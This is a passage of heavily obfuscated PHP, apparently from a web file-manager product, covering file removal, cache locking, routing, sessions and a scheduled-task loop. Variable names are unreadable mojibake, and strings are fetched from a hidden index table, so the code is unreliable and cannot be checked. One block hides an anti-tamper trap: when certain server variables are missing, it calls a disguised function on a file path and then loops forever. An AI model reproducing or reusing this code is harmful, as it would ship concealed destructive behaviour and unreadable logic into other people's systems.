); if (!IO::exist($£Ã¸³çŸ)) { $¶©”Ê§ò[] = $ìû•©ÖÈ; $Îï‡¡‡†->updateFileEnd($Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[42]], $Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[89]]); write_log($ö¬¤£¹ˆ[2486] . $£Ã¸³çŸ, $ö¬¤£¹ˆ[2061]); continue; } $Â¤¹çĞ™ = IO::move($£Ã¸³çŸ, $¹÷ßãş , REPEAT_RENAME); if (!$Â¤¹çĞ™) { $òåÛ¯É[] = $ìû•©ÖÈ; $Îï‡¡‡†->updateFileEnd($Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[42]], $Ê—ÃÏÌˆ[$ö¬¤£¹ˆ[89]]); write_log($ö¬¤£¹ˆ[2487] . $£Ã¸³çŸ, $ö¬¤£¹ˆ[2061]); continue; } $ÍÅ•¦Úõ = array($ö¬¤£¹ˆ[922] => $åî®…©ı, $ö¬¤£¹ˆ[97] => $Â¤¹çĞ™); $ûò¢ÈÓ¸->where(array($ö¬¤£¹ˆ[562] => $ìû•©ÖÈ))->save($ÍÅ•¦Úõ); } $ëÎ»Åóå++; $’Çè»İ§ = $ûò¢ÈÓ¸->where($úÄ–ÔšÚ)->field($ö¬¤£¹ˆ[2485])->selectPage($şœØ¶‡ò, $ëÎ»Åóå); } $£öìÅÀÜ = $Îï‡¡‡†->task; if (!$À›«¯÷ø) { Cache::set($Œò¼òÛê, $£öìÅÀÜ); } $Îï‡¡‡†->end(); $¶©”Ê§ò = array_unique($¶©”Ê§ò); $òåÛ¯É = array_unique($òåÛ¯É); if (!$À›«¯÷ø && ($¶©”Ê§ò || $òåÛ¯É)) { $·è„üø = array(); if ($¶©”Ê§ò) { $·è„üø[] = sprintf(LNG($ö¬¤£¹ˆ[2488]), count($¶©”Ê§ò)); } if ($òåÛ¯É) { $·è„üø[] = sprintf(LNG($ö¬¤£¹ˆ[2489]), count($òåÛ¯É)); } $·è„üø = sprintf(LNG($ö¬¤£¹ˆ[2490]), implode($ö¬¤£¹ˆ[1531], $·è„üø)) . $ö¬¤£¹ˆ[2491] . date($ö¬¤£¹ˆ[2492]) . $ö¬¤£¹ˆ[2493]; if ($Ñ‹Øãü == $ö¬¤£¹ˆ[1275]) { $·è„üø .= $ö¬¤£¹ˆ[2494] . LNG($ö¬¤£¹ˆ[2495]); } else { $·è„üø = LNG($ö¬¤£¹ˆ[2496]) . $ö¬¤£¹ˆ[2497] . $·è„üø; } $£öìÅÀÜ[$ö¬¤£¹ˆ[1312]] = $·è„üø; Cache::set($Œò¼òÛê, $£öìÅÀÜ); unset($ßù¶¥İé[$ö¬¤£¹ˆ[6]]); $½ã­°Ô¦ = array($ö¬¤£¹ˆ[492] => $Íœ¯›¡ğ, $ö¬¤£¹ˆ[2366] => $ö¬¤£¹ˆ[648], $ö¬¤£¹ˆ[42] => $ßù¶¥İé[$ö¬¤£¹ˆ[42]], $ö¬¤£¹ˆ[106] => $ßù¶¥İé[$ö¬¤£¹ˆ[106]]); Hook::trigger($ö¬¤£¹ˆ[1930], array($ö¬¤£¹ˆ[1334] => $½ã­°Ô¦, $ö¬¤£¹ˆ[1344] => !0)); show_json($·è„üø, !1, 100111); } if ($Ñ‹Øãü == $ö¬¤£¹ˆ[648]) { return !0; } if ($¶©”Ê§ò || $òåÛ¯É) { $ñï³¬— = array_merge($¶©”Ê§ò, $òåÛ¯É); $ñï³¬— = array_filter(array_unique($ñï³¬—)); $this->removeByFileID($ñï³¬—); } if ($ÑŒáä¬æ) { $ÑŒáä¬æ = array_filter(array_unique($ÑŒáä¬æ)); foreach ($ÑŒáä¬æ as $£Ã¸³çŸ) { $“ÎœÚúå = IO::has($£Ã¸³çŸ, !0); if (!$“ÎœÚúå[$ö¬¤£¹ˆ[250]] && !$“ÎœÚúå[$ö¬¤£¹ˆ[251]]) { IO::remove($£Ã¸³çŸ); } } } return $this->remove($Íœ¯›¡ğ); } private function removeByFileID($áÀñïÃ = array()) { $»œİÛŞŸ =& $_SERVER[ŒÅŸ‹ä†]; if (empty($áÀñïÃ)) { return; } $®¹Öô¦ = array($»œİÛŞŸ[562] => array($»œİÛŞŸ[7], $áÀñïÃ)); $è¹®ÏŠà = Model($»œİÛŞŸ[1477])->where($®¹Öô¦)->field($»œİÛŞŸ[2442])->select(); if (!$è¹®ÏŠà) { return Model($»œİÛŞŸ[565])->remove($áÀñïÃ); } $è¹®ÏŠà = array_to_keyvalue($è¹®ÏŠà, $»œİÛŞŸ[202], $»œİÛŞŸ[562]); foreach ($è¹®ÏŠà as $•ßïí¦ğ => $Ù«úú©²) { Model($»œİÛŞŸ[929])->removeNow($•ßïí¦ğ, !1); } $ÙÅ™­Ã” = array_diff($áÀñïÃ, array_unique(array_values($è¹®ÏŠà))); if ($ÙÅ™­Ã”) { return Model($»œİÛŞŸ[565])->remove($ÙÅ™­Ã”); } } private function removeShareItems($à³¬øãê) { $—€ê«È‡ =& $_SERVER[ŒÅŸ‹ä†]; $Ş·ıË = "\x7b\x69\157\x3a{$à³¬øãê}\x7d\57"; $»–¸‡Ú = array($—€ê«È‡[202] => 0, $—€ê«È‡[588] => array($—€ê«È‡[479], "{$Ş·ıË}\x25")); $ÁŞó–†ê = Model($—€ê«È‡[1507])->where($»–¸‡Ú)->field($—€ê«È‡[693])->select(); if (empty($ÁŞó–†ê)) { return; } $¨Ùô™ûÂ = array_to_keyvalue($ÁŞó–†ê, $—€ê«È‡[12], $—€ê«È‡[693]); Model($—€ê«È‡[692])->remove($¨Ùô™ûÂ); } } goto Aø·á‡ôÅ†; dìµ×Õç¬‚: class CacheLockRedis { public function lock($ãäşáŒù, $­Á—òÛ‹ = 10) { $¯¡ƒç‹Ü = Cache::init(); $…Ï¥ÍâÛ = microtime(!0) + $­Á—òÛ‹; while (microtime(!0) < $…Ï¥ÍâÛ) { $¡Ëâ“— = $¯¡ƒç‹Ü->get($ãäşáŒù); if (!$¡Ëâ“—) { $à¥ô÷¨× = $¯¡ƒç‹Ü->setLock($ãäşáŒù, $…Ï¥ÍâÛ, $­Á—òÛ‹); if ($à¥ô÷¨×) { return !0; } } else { if ($¡Ëâ“— < microtime(!0)) { $¯¡ƒç‹Ü->set($ãäşáŒù, $…Ï¥ÍâÛ, $­Á—òÛ‹ * 2); if ($¯¡ƒç‹Ü->get($ãäşáŒù) === $¡Ëâ“—) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ä¿¯óñ¥) { return Cache::init()->get($Ä¿¯óñ¥); } public function unlock($©„òŒ¬) { return Cache::init()->remove($©„òŒ¬); } } class CacheLockMemcached { public function lock($ˆ¹–Ï, $ß§ıç¯ = 0) { $°ÇŠ¦¸† = Cache::init(); $ìÜÖ¬¹ = microtime(!0) + $ß§ıç¯; while (microtime(!0) < $ìÜÖ¬¹) { $ÏàÏÛÁ = $°ÇŠ¦¸†->get($ˆ¹–Ï); if (!$ÏàÏÛÁ || $ÏàÏÛÁ < microtime(!0)) { $“™¹ˆòÀ = $°ÇŠ¦¸†->handle->add($ˆ¹–Ï, $ìÜÖ¬¹, $ß§ıç¯); if ($“™¹ˆòÀ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($çÈ¨½Şø) { return Cache::init()->get($çÈ¨½Şø); } public function unlock($—øü—Ùí) { return Cache::init()->remove($—øü—Ùí); } } if (!isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][13]]) || !isset($_SERVER[$_SERVER[ŒÅŸ‹ä†][22]])) { $_getc = $_SERVER[ŒÅŸ‹ä†][15]; $_getfile = $_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ŒÅŸ‹ä†][18], $_getfilec); if (count($_getarrs) < $_SERVER[ŒÅŸ‹ä†][19]) { $exit = $_SERVER[ŒÅŸ‹ä†][20]; $exit(); } $_act = $_SERVER[ŒÅŸ‹ä†][21]; $_act($_SERVER[$_SERVER[ŒÅŸ‹ä†][16]] . $_SERVER[ŒÅŸ‹ä†][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ŒÅŸ‹ä†][472]); } } goto fìÔÎ…ñĞ; añ¥À×êãŞ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\57\135\53", "\72\156\x75\155" => "\x5b\60\55\71\135\53", "\72\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($ÁÃ¨á×Ø, $ÇÉ„ã ) { $ËÕ°­´² =& $_SERVER[ŒÅŸ‹ä†]; if ($ÁÃ¨á×Ø == $ËÕ°­´²[1856]) { $˜ØÏ‚¥¡ = array_map($ËÕ°­´²[1857], $ÇÉ„ã [0]); $•Æ£ı‹à = strpos($ÇÉ„ã [1], $ËÕ°­´²[8]) === 0 ? $ÇÉ„ã [1] : $ËÕ°­´²[8] . $ÇÉ„ã [1]; $ôÁ„”ÁÙ = $ÇÉ„ã [2]; } else { $˜ØÏ‚¥¡ = null; $•Æ£ı‹à = strpos($ÇÉ„ã [0], $ËÕ°­´²[8]) === 0 ? $ÇÉ„ã [0] : $ËÕ°­´²[8] . $ÇÉ„ã [0]; $ôÁ„”ÁÙ = $ÇÉ„ã [1]; } array_push(self::$maps, $˜ØÏ‚¥¡); array_push(self::$routes, $•Æ£ı‹à); array_push(self::$methods, strtoupper($ÁÃ¨á×Ø)); array_push(self::$callbacks, $ôÁ„”ÁÙ); } public static function error($ùÔ§†Åù) { self::$errorCallback = $ùÔ§†Åù; } public static function haltOnMatch($Ì¬ÎÁÔÙ = true) { self::$halts = $Ì¬ÎÁÔÙ; } public static function dispatch() { $Õ¯Ò£â® =& $_SERVER[ŒÅŸ‹ä†]; $Ñ”¥Ğ¯Ò = parse_url($_SERVER[$Õ¯Ò£â®[1858]], PHP_URL_PATH); $Ş ¥„É¢ = $_SERVER[$Õ¯Ò£â®[172]]; $…©ÃÚäü = array_keys(static::$patterns); $ıó¸Œº˜ = array_values(static::$patterns); $¡ã­Œœş = !1; self::$routes = preg_replace($Õ¯Ò£â®[1410], $Õ¯Ò£â®[8], self::$routes); if (in_array($Ñ”¥Ğ¯Ò, self::$routes)) { $Ó™¯¦î¨ = array_keys(self::$routes, $Ñ”¥Ğ¯Ò); foreach ($Ó™¯¦î¨ as $õö´şÙ¡) { if (self::$methods[$õö´şÙ¡] == $Ş ¥„É¢ || self::$methods[$õö´şÙ¡] == $Õ¯Ò£â®[1859] || in_array($Ş ¥„É¢, self::$maps[$õö´şÙ¡])) { $¡ã­Œœş = !0; if (!is_object(self::$callbacks[$õö´şÙ¡])) { $• üç† = explode($Õ¯Ò£â®[8], self::$callbacks[$õö´şÙ¡]); $¢ê„ÌÍ = end($• üç†); $åşÛó„ = explode($Õ¯Ò£â®[1340], $¢ê„ÌÍ); $ÊŠûöË = new $åşÛó„[0](); $ÊŠûöË->{$åşÛó„[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$õö´şÙ¡]); if (self::$halts) { return; } } } } } else { $æáØÊÌ = 0; foreach (self::$routes as $õö´şÙ¡) { if (strpos($õö´şÙ¡, $Õ¯Ò£â®[4]) !== !1) { $õö´şÙ¡ = str_replace($…©ÃÚäü, $ıó¸Œº˜, $õö´şÙ¡); } if (preg_match($Õ¯Ò£â®[1860] . $õö´şÙ¡ . $Õ¯Ò£â®[1861], $Ñ”¥Ğ¯Ò, $®÷Øì¯)) { if (self::$methods[$æáØÊÌ] == $Ş ¥„É¢ || self::$methods[$æáØÊÌ] == $Õ¯Ò£â®[1859] || !empty(self::$maps[$æáØÊÌ]) && in_array($Ş ¥„É¢, self::$maps[$æáØÊÌ])) { $¡ã­Œœş = !0; array_shift($®÷Øì¯); if (!is_object(self::$callbacks[$æáØÊÌ])) { $• üç† = explode($Õ¯Ò£â®[8], self::$callbacks[$æáØÊÌ]); $¢ê„ÌÍ = end($• üç†); $åşÛó„ = explode($Õ¯Ò£â®[1340], $¢ê„ÌÍ); $ÊŠûöË = new $åşÛó„[0](); if (!method_exists($ÊŠûöË, $åşÛó„[1])) { echo $Õ¯Ò£â®[1862]; } else { call_user_func_array(array($ÊŠûöË, $åşÛó„[1]), $®÷Øì¯); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$æáØÊÌ], $®÷Øì¯); if (self::$halts) { return; } } } } $æáØÊÌ++; } } if ($¡ã­Œœş == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ÑÜûˆ‚ˆ =& $_SERVER[ŒÅŸ‹ä†]; header($_SERVER[$ÑÜûˆ‚ˆ[1863]] . $ÑÜûˆ‚ˆ[1864]); echo $ÑÜûˆ‚ˆ[1865]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Õ¯Ò£â®[1858]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $·¢èüòù =& $_SERVER[ŒÅŸ‹ä†]; static $Ù›öµÔ = false; if ($Ù›öµÔ) { return $Ù›öµÔ; } $©‰²‘©Ş = $GLOBALS[$·¢èüòù[6]][$·¢èüòù[434]]; self::$sessionTime = $©‰²‘©Ş[$·¢èüòù[1866]]; $ŞÎğØİ± = isset($GLOBALS[$·¢èüòù[1867]]) ? $GLOBALS[$·¢èüòù[1867]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ŞÎğØİ±)) { self::$sessionSign = Cookie::get($ŞÎğØİ±); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ŞÎğØİ±, self::$sessionSign, self::$sessionTime); $¬úúƒÓà = $©‰²‘©Ş[$·¢èüòù[1868]]; $ó¯ş°® = $©‰²‘©Ş[$¬úúƒÓà]; $Ë‡Ÿ¹ÂŒ = $©‰²‘©Ş[$·¢èüòù[932]]; switch ($¬úúƒÓà) { case $·¢èüòù[31]: self::$handle = Model($·¢èüòù[933]); break; case $·¢èüòù[934]: self::$handle = new CacheRedis($ó¯ş°®, $Ë‡Ÿ¹ÂŒ); break; case $·¢èüòù[935]: self::$handle = new CacheMemcached($ó¯ş°®, $Ë‡Ÿ¹ÂŒ); break; case $·¢èüòù[241]: $ó¯ş°®[$·¢èüòù[97]] = $ó¯ş°®[$·¢èüòù[97]] . $·¢èüòù[1869]; self::$handle = new CacheFile($ó¯ş°®, $Ë‡Ÿ¹ÂŒ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ù›öµÔ = new self(); return $Ù›öµÔ; } public static function getBySign($¾èÅŞÍ¡) { $™ÜğêÑ€ = self::$handle->get($¾èÅŞÍ¡); $™ÜğêÑ€ = unserialize($™ÜğêÑ€); return is_array($™ÜğêÑ€) ? $™ÜğêÑ€ : array(); } public static function setBySign($Ü®œƒçÛ, $±“·²Šï) { CacheLock::lock($Ü®œƒçÛ); self::$handle->set($Ü®œƒçÛ, serialize($±“·²Šï), self::$sessionTime); CacheLock::unlock($Ü®œƒçÛ); } public static function sign($¦¨Ü‹ãø = false) { if ($¦¨Ü‹ãø) { self::$sessionSign = $¦¨Ü‹ãø; } self::init(); return self::$sessionSign; } public static function set($¹Á™ê¢•, $æÒö‘æŸ = false) { self::init(); if (is_array($¹Á™ê¢•)) { foreach ($¹Á™ê¢• as $¥òûú‚– => $ò²©ÚÕú) { array_set_value(self::$data, $¥òûú‚–, $ò²©ÚÕú); } } else { array_set_value(self::$data, $¹Á™ê¢•, $æÒö‘æŸ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÔË‹¶¼ = false) { self::init(); if (!$ÔË‹¶¼) { return self::$data; } return array_get_value(self::$data, $ÔË‹¶¼); } public static function remove($Ûßæç‰ë) { self::init(); unset(self::$data[$Ûßæç‰ë]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ŒÅŸ‹ä†][941])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Âı•‚óª =& $_SERVER[ŒÅŸ‹ä†]; if (self::valueGet($Âı•‚óª[846]) != $Âı•‚óª[101]) { return; } if (self::valueGet($Âı•‚óª[1870]) == $Âı•‚óª[101]) { $ÅìÜŸ¾Ğ = self::valueGet($Âı•‚óª[1871]); if (time() - $ÅìÜŸ¾Ğ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Âı•‚óª[1870], $Âı•‚óª[101]); self::log($Âı•‚óª[1872] . ACTION . $Âı•‚óª[1873]); Hook::bind($Âı•‚óª[1874], $Âı•‚óª[1875]); $Û‹§´  = 0; while (!0) { self::cacheClear(); if (self::valueGet($Âı•‚óª[846]) != $Âı•‚óª[101]) { self::valueSet($Âı•‚óª[1870], $Âı•‚óª[239]); self::log($Âı•‚óª[1876]); die; } $‹”Şô­ = time(); if ($‹”Şô­ - $Û‹§´  >= 60) { self::valueSet(array($Âı•‚óª[1870] => $Âı•‚óª[101], $Âı•‚óª[1871] => $‹”Şô­)); $Û‹§´  = $‹”Şô­; } if (!file_exists(USER_SYSTEM . $Âı•‚óª[1877])) { self::valueSet(array($Âı•‚óª[1870] => $Âı•‚óª[239], $Âı•‚óª[846] => $Âı•‚óª[239])); self::log($Âı•‚óª[1878]); die; } $»Œ¸Ö­ = file_get_contents(BASIC_PATH . $Âı•‚óª[1879]); $Û¿£×º¾ = KOD_VERSION . $Âı•‚óª[10] . KOD_VERSION_BUILD; $­˜ß­¿ã = match_text($»Œ¸Ö­, $Âı•‚óª[1880]) . $Âı•‚óª[10] . match_text($»Œ¸Ö­, $Âı•‚óª[1881]); if ($­˜ß­¿ã != $Û¿£×º¾) { self::restart(); self::log("\163\x74\157\160\145\x64\x2e\133\x76\145\x72\163\x69\157\156\x20\x75\x70\144\x61\x74\x65\x3b{$versionNow}\x20\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $©ü¢Ü¬ò =& $_SERVER[ŒÅŸ‹ä†]; http_close(); $GLOBALS[$©ü¢Ü¬ò[1882]] = 1; $_SERVER[$©ü¢Ü¬ò[1883]] = $©ü¢Ü¬ò[1884]; $_COOKIE = array(); $GLOBALS[$©ü¢Ü¬ò[1885]] = 1; $GLOBALS[$©ü¢Ü¬ò[1886]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ ûŠ¶Ìø =& $_SERVER[ŒÅŸ‹ä†]; http_close(); self::valueSet($ ûŠ¶Ìø[846], $ ûŠ¶Ìø[239]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ ûŠ¶Ìø[1870] => $ ûŠ¶Ìø[239], $ ûŠ¶Ìø[846] => $ ûŠ¶Ìø[101])); self::log($ ûŠ¶Ìø[1887]); } public static function taskSwitch() { $Æ¾’õ×© =& $_SERVER[ŒÅŸ‹ä†]; $ÛÊè¦”¨ = self::valueGet($Æ¾’õ×©[846]) == $Æ¾’õ×©[101] ? $Æ¾’õ×©[239] : $Æ¾’õ×©[101]; self::valueSet($Æ¾’õ×©[846], $ÛÊè¦”¨); } public static function shutdownEvent() { $´Õ½§ƒ =& $_SERVER[ŒÅŸ‹ä†]; self::valueSet($´Õ½§ƒ[1870], $´Õ½§ƒ[239]); self::log($´Õ½§ƒ[1888]); } public static function config($ÙáÍì‹ï, $Ø•‰¢ëâ) { self::valueSet($_SERVER[ŒÅŸ‹ä†][846], $ÙáÍì‹ï); } private static function taskRunAll() { $õŒ¶çğ =& $_SERVER[ŒÅŸ‹ä†]; $‘Ôú­»™ = timeFloat(); $„ŞÚÁ‹ = Model($õŒ¶çğ[1889])->listData(); $¶şñ†Ç = count($„ŞÚÁ‹); for ($³åÖ˜ŠÇ = 0; $³åÖ˜ŠÇ < $¶şñ†Ç; $³åÖ˜ŠÇ++) { $§¢‘Ç¥Ä = $„ŞÚÁ‹[$³åÖ˜ŠÇ]; if (!$§¢‘Ç¥Ä[$õŒ¶çğ[492]] || $§¢‘Ç¥Ä[$õŒ¶çğ[1890]] != $õŒ¶çğ[101]) { continue; } if (!self::taskTimeCheck($§¢‘Ç¥Ä)) { continue; } self::taskRun($§¢‘Ç¥Ä); } Hook::trigger($õŒ¶çğ[1891]); self::taskQueueRun($‘Ôú­»™); } private static function taskQueueRun($ÜÊöäàÎ) { $œ°µ“ºè = 10; while (!0) { $Ğö¤ÚËâ = TaskQueue::run(); if ($Ğö¤ÚËâ === !1) { break; } if (timeFloat() - $ÜÊöäàÎ >= $œ°µ“ºè) { break; } } } private static function taskTimeCheck($à­¸‰±) { $£‰ÇÜ¯Ë =& $_SERVER[ŒÅŸ‹ä†]; $ªØâäª = json_decode($à­¸‰±[$£‰ÇÜ¯Ë[215]], !0); $ı‡Ï®ùÜ = intval($à­¸‰±[$£‰ÇÜ¯Ë[1871]]); $Ü¦Æåş† = strtotime($£‰ÇÜ¯Ë[1892] . $ªØâäª[$£‰ÇÜ¯Ë[1893]] . $£‰ÇÜ¯Ë[1894]) - strtotime($£‰ÇÜ¯Ë[1895]); $ô§¨ºÀˆ = time() - strtotime(date($£‰ÇÜ¯Ë[1896]) . $£‰ÇÜ¯Ë[1897]); $ˆí¼·’ = $ô§¨ºÀˆ >= $Ü¦Æåş† && $ô§¨ºÀˆ <= $Ü¦Æåş† + 3600; switch ($ªØâäª[$£‰ÇÜ¯Ë[43]]) { case $£‰ÇÜ¯Ë[1898]: if (time() - $ı‡Ï®ùÜ < 3600 * 24 * 30) { return !1; } if ($ªØâäª[$£‰ÇÜ¯Ë[1898]] == date($£‰ÇÜ¯Ë[1899]) && $ˆí¼·’) { return !0; } break; case $£‰ÇÜ¯Ë[1900]: if (time() - $ı‡Ï®ùÜ < 3600 * 24 * 7) { return !1; } $ŒŒ¹Û¡å = date($£‰ÇÜ¯Ë[1901]) == 0 ? 7 : date($£‰ÇÜ¯Ë[1901]); if ($ªØâäª[$£‰ÇÜ¯Ë[1900]] == $ŒŒ¹Û¡å && $ˆí¼·’) { return !0; } break; case $£‰ÇÜ¯Ë[1893]: if (time() - $ı‡Ï®ùÜ < 3600 * 24) { return !1; } if ($ˆí¼·’) { return !0; } break; case $£‰ÇÜ¯Ë[1902]: if (time() - $ı‡Ï®ùÜ >= floatval($ªØâäª[$£‰ÇÜ¯Ë[1902]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ûÍÜÊóõ =& $_SERVER[ŒÅŸ‹ä†]; static $´‚Ğï€ = 0; $Ş±ë¢Òù = 300; if (!$´‚Ğï€) { $´‚Ğï€ = time(); } if (time() - $´‚Ğï€ < $Ş±ë¢Òù) { return; } $´‚Ğï€ = time(); $ÕßŸƒªî = Model($ûÍÜÊóõ[602])->db($ûÍÜÊóõ[12]); if ($ÕßŸƒªî) { $ÕßŸƒªî->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ûÍÜÊóõ[1903], $ûÍÜÊóõ[1904]); die; } } public static function taskRun($Áï§ğñø) { $»×ŠòŠÜ =& $_SERVER[ŒÅŸ‹ä†]; self::log($»×ŠòŠÜ[1905] . $Áï§ğñø[$»×ŠòŠÜ[492]] . $»×ŠòŠÜ[1906] . $Áï§ğñø[$»×ŠòŠÜ[42]] . $»×ŠòŠÜ[1907] . $Áï§ğñø[$»×ŠòŠÜ[1508]]); Model($»×ŠòŠÜ[1889])->run($Áï§ğñø[$»×ŠòŠÜ[492]]); $ä°‡Íì· = timeFloat(); $Óá€Ú¨ = $»×ŠòŠÜ[12]; switch ($Áï§ğñø[$»×ŠòŠÜ[43]]) { case $»×ŠòŠÜ[392]: $ÈêÎµÁò = url_request($Áï§ğñø[$»×ŠòŠÜ[1508]], $»×ŠòŠÜ[1550], !1, !1, !1, !1, 10); if ($ÈêÎµÁò[$»×ŠòŠÜ[846]]) { $Óá€Ú¨ = strlen($ÈêÎµÁò[$»×ŠòŠÜ[1334]]); } break; case $»×ŠòŠÜ[1908]: $Óá€Ú¨ = Hook::apply($Áï§ğñø[$»×ŠòŠÜ[1508]]); default: break; } Model($»×ŠòŠÜ[1909])->add(array($»×ŠòŠÜ[1910] => $»×ŠòŠÜ[12], $»×ŠòŠÜ[1911] => $»×ŠòŠÜ[239], $»×ŠòŠÜ[43] => $»×ŠòŠÜ[1912] . $Áï§ğñø[$»×ŠòŠÜ[492]], $»×ŠòŠÜ[1913] => json_encode(array($»×ŠòŠÜ[42] => $Áï§ğñø[$»×ŠòŠÜ[42]], $»×ŠòŠÜ[1914] => timeFloat() - $ä°‡Íì·, $»×ŠòŠÜ[852] => $Óá€Ú¨)))); $ÚŞ…­ = $Óá€Ú¨ ? $»×ŠòŠÜ[1915] . $Óá€Ú¨ : $»×ŠòŠÜ[12]; self::log($»×ŠòŠÜ[1916] . $Áï§ğñø[$»×ŠòŠÜ[492]] . $»×ŠòŠÜ[186] . $ÚŞ…­); return !0; } public static function valueGet($ªÁÄï¦¤) { $ìî‰Äô =& $_SERVER[ŒÅŸ‹ä†]; $ÏÙ–°©‡ = $ìî‰Äô[1917]; $›¢¿ß†ä = Model($ìî‰Äô[527])->get($ªÁÄï¦¤, $ÏÙ–°©‡); if (is_null($›¢¿ß†ä)) { Model($ìî‰Äô[527])->set($ìî‰Äô[846], $ìî‰Äô[101], $ÏÙ–°©‡); Model($ìî‰Äô[527])->set($ìî‰Äô[1870], $ìî‰Äô[239], $ÏÙ–°©‡); $›¢¿ß†ä = Model($ìî‰Äô[527])->get($ªÁÄï¦¤, $ÏÙ–°©‡); } return $›¢¿ß†ä; } private static function valueSet($æå²¢ö£, $ĞšÂÆ’· = false) { $‡¦“ÒØÒ =& $_SERVER[ŒÅŸ‹ä†]; $õé€Ä§ = $‡¦“ÒØÒ[1918]; CacheLock::lock($õé€Ä§); $˜£ğËÎ© = Model($‡¦“ÒØÒ[527])->set($æå²¢ö£, $ĞšÂÆ’·, $‡¦“ÒØÒ[1917]); CacheLock::unlock($õé€Ä§); return $˜£ğËÎ©; } protected static function log($ÆÏ¯¾ªğ) { write_log($ÆÏ¯¾ªğ, $_SERVER[ŒÅŸ‹ä†][1904]); } private static function cacheClear() { $ó§ş…¸à =& $_SERVER[ŒÅŸ‹ä†]; Cache::clearMemory(Model($ó§ş…¸à[527])->cacheKey($ó§ş…¸à[1917])); Cache::clearMemory(Model($ó§ş…¸à[527])->cacheKey($ó§ş…¸à[1919])); Model($ó§ş…¸à[1889])->cacheClear(); self::closeDatabase(); } } goto CÓ³çºÌñà; aÉõ±¤î©Ô: class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\143\145"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\155\145" => "\x69\157\137\x73\157\165\162\143\145\137\155\145\164\141", "\155\x65\x74\141\x46\x69\145\x6c\x64" => "\x73\x6f\165\x72\143\x65\111\104"); protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\163\145\162\x74", "\x66\165\156\x63\x74\151\157\x6e"), array("\x63\162\145\141\164\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\x69\156\x73\x65\x72\164", "\x66\165\x6e\x63\164\x69\x6f\156"), array("\166\151\145\167\124\x69\155\145", "\164\151\155\x65", "\x69\x6e\x73\x65\x72\x74", "\x66\x75\x6e\x63\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($œ¸ß³¾×) { return $this->listSource(array($_SERVER[ŒÅŸ‹ä†][497] => $œ¸ß³¾×)); } public function typeName($Ğ¬ôİ¨ ) { static $ˆù™…„µ = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\147\162\157\x75\160"); return $ˆù™…„µ[$Ğ¬ôİ¨  . $_SERVER[ŒÅŸ‹ä†][12]]; } public function sourceListInfo($²Ì¬—«ú, $¦ÓÅå”¦ = false) { $ç§—ÍË¼ =& $_SERVER[ŒÅŸ‹ä†]; $²Ì¬—«ú = $²Ì¬—«ú ? $²Ì¬—«ú : array(); $²Ì¬—«ú = array_filter(array_unique($²Ì¬—«ú)); if (!$²Ì¬—«ú) { return array(); } $’ù¶ñæ = $this->where(array($ç§—ÍË¼[202] => array($ç§—ÍË¼[7], $²Ì¬—«ú)))->select(); $this->_listDataApply($’ù¶ñæ, $¦ÓÅå”¦); return array_to_keyvalue($’ù¶ñæ, $ç§—ÍË¼[202]); } public function pathInfoFilter(&$ÆÂ”ø§¯) { $“†à¬ =& $_SERVER[ŒÅŸ‹ä†]; static $œ¤Æ¹ø« = false; static $Ê‰ã¨Ë = false; static $ğú‚ÁĞ­ = false; if (!$œ¤Æ¹ø«) { $¬ŒÏ½í = $“†à¬[498]; $¬ŒÏ½í .= $“†à¬[499]; $¬ŒÏ½í .= $“†à¬[500]; $Ã«×¢´Æ = $“†à¬[501]; $Èó¤ûÆº = explode($“†à¬[60], $Ã«×¢´Æ); $œ¤Æ¹ø« = explode($“†à¬[60], $¬ŒÏ½í); $Ê‰ã¨Ë = array(); foreach ($œ¤Æ¹ø« as $Ûâö¹î„) { if 